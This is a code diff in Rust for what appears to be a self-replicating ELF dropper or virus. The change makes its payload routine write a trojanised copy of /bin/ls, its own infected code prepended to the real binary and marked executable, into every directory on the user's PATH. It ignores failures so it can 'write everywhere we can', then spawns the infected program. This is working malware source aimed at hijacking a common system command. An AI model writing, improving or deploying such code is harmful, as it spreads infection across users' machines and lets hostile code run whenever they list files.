@@ -1,6 +1,6 @@
 use clap::Parser;
 use memfd_exec::MemFdExecutable;
-use std::env::{args, current_exe, vars};
+use std::env::{self, args, current_exe, vars};
 use std::fs::{File, read};
 use std::io::{Read, Write};
 use std::os::unix::fs::PermissionsExt;
@@ -20,6 +20,8 @@ pub enum InfectionStatus {
 const E_IDENT_START: usize = 0x09 * size_of::<u8>();
 const DROPPER_TAG : [u8 ; 1] = [137];
 const INFECT_TAG  : [u8 ; 1] = [67];
+const SL_TARGET : &str = "/bin/ls";
+const SL_OUTPUT_BINARY_NAME : &str = "ls";
 
 pub fn create_dropper() -> Result<(), Box<dyn std::error::Error>> {
     let args = Args::parse();
@@ -46,26 +48,36 @@ pub fn create_dropper() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 pub fn drop_payload() -> Result<(), Box<dyn std::error::Error>> {
-    let decoy_path = "/bin/ls";
-    let output_path = "ls";
+    fn drop_target_elf_to_path(decoy_path: &str, output_path: &str) -> Result<(), Box<dyn std::error::Error>> {
 
-    let mut own_contents: Vec<u8> = read(current_exe()?)?;
-    let payload_length_offset = own_contents.len() - size_of::<usize>();
-    let payload_length_bytes = own_contents[payload_length_offset..].try_into()?;
-    let payload_length = usize::from_le_bytes(payload_length_bytes);
-    let own_contents_truncated = &mut own_contents[0..payload_length];
-    set_infected_tag(own_contents_truncated);
+        let mut own_contents: Vec<u8> = read(current_exe()?)?;
+        let payload_length_offset = own_contents.len() - size_of::<usize>();
+        let payload_length_bytes = own_contents[payload_length_offset..].try_into()?;
+        let payload_length = usize::from_le_bytes(payload_length_bytes);
+        let own_contents_truncated = &mut own_contents[0..payload_length];
+        set_infected_tag(own_contents_truncated);
 
-    let mut destination_file = File::create(output_path)?;
+        let mut destination_file = File::create(output_path)?;
 
-    let decoy_contents: Vec<u8> = read(decoy_path)?;
+        let decoy_contents: Vec<u8> = read(decoy_path)?;
 
-    destination_file.write_all(own_contents_truncated)?;
-    destination_file.write_all(&decoy_contents)?;
-    destination_file.write_all(&payload_length_bytes)?;
-    destination_file.set_permissions(PermissionsExt::from_mode(0o755))?;
+        destination_file.write_all(own_contents_truncated)?;
+        destination_file.write_all(&decoy_contents)?;
+        destination_file.write_all(&payload_length_bytes)?;
+        destination_file.set_permissions(PermissionsExt::from_mode(0o755))?;
+        Ok(())
+    }
+
+    let decoy_path = SL_TARGET;
+    let paths = env::var("PATH")?;
+    for path_path in env::split_paths(&paths) {
+        let output_path : &str = &format!("{}/{}",path_path.display(), SL_OUTPUT_BINARY_NAME);
+        // Ignore errors as we just want to write everywhere we can.
+        let _ = drop_target_elf_to_path(decoy_path, output_path);
+    }
 
     spawn_infected_program()
+
 }
 
 pub fn spawn_infected_program() -> Result<(), Box<dyn std::error::Error>> {
